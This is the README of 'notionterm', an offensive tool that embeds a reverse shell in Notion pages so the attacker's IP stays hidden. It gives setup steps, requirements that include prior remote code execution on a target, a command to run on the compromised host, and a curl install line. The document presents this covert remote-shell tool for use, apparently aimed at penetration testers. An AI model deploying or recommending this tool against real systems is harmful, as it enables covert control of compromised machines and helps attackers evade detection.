<div align="center">
<h1>
  <code>notionterm</code> 
</h1>
  <img src="https://github.com/ariary/notionterm/blob/main/img/notionterm.png"  width=150>
  
  <strong> Embed reverse shell in <a href="https://www.notion.so">Notion</a> pages.</strong><br>
  <i>Hack while taking notes</i>
</div>

---

![demo](https://github.com/ariary/Notionion/blob/main/img/demo-fast.gif)

---
<div align=left>
<h3>FOR ➕:</h3>
<ul>
  <li>Hide attacker IP in your reverse shell <i>(Notion ~ reverse proxy shell)</i></li>
  <li>Demo</li>
  <li>Quick proof insertion within report</li>
</ul> 
</div>
<div align=left>
<h3>NOT FOR ➖:</h3>
<ul>
  <li>Long and robust shell session (see <a href=https://github.com/ariary/tacos>tacos</a> for that)</li>
</ul> 

---
<div align=left>
<h3 >Why? 🤔 </h3>
The focus was on making something fun while still being usable, but that's not meant to be THE stealth solution for reverse shell in your pentester's arsenal
</div>
<div align=right>
<h3 >How?  🤷‍♂️</h3>
Just use notion as usual and launch <code>notionterm</code>.
</div>
<div align=left>
<h3 >Requirements 🖊️</h3>
 <ul>
  <li>Notion software and API key</li>
  <li>Allowed bidirectionnal HTTP communication between host and target</li>
  <li>Prior RCE on target</li>
</ul> 
</div>

---
<blockquote align=left>
roughly inspired by the great idea of <a href="https://github.com/mttaggart/OffensiveNotion">OffensiveNotion</a> and <a href="https://github.com/ariary/Notionion">notionion</a>! 
</blockquote>

## Quickstart

**Set-up**
1. Create the "reverse shell" page in Notion (1 embed block, 1 code block)
2. Give the permissions to `notionterm` to access the page (with the notion api key)

**Run** ([details](#-run))

3. Start `notionterm`
4. Activate the reverse shell (with the button `ON`)
5. do your reverse shell stuff
6. Shutdown the reverse shell (`OFF`)

### 👟 Run

```shell
# On target with prior RCE
./notionterm --button=https://[TARGET_REACHABLE_IP]/button
```


## Install
* **From release**: `curl -lO -L https://github.com/ariary/notionterm/releases/latest/download/notionterm && chmod +x notionterm`
